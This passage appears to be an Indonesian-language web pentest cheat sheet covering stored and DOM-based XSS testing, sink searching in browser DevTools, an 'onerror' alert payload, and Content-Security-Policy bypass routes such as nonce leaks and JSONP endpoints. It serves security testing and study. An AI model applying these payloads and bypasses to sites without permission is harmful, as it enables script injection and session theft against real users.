Simpan ke stored field → tunggu admin bot → Poll now

=== DOM XSS (DevTools) ===
F12 → Sources → Ctrl+Shift+F
Cari: innerHTML, document.write, eval, location.hash, location.search
Test di URL bar browser langsung (bukan Repeater)
innerHTML: <img src=x onerror=alert(1)>  (bukan <script>!)

=== CSP CHECK ===
[HTTP History → Response → Headers]
Content-Security-Policy: ...
Paste ke csp-evaluator.withgoogle.com
unsafe-inline (tanpa nonce/hash) → inline inject candidate | nonce ada → cari leak | whitelist domain → cari JSONP
```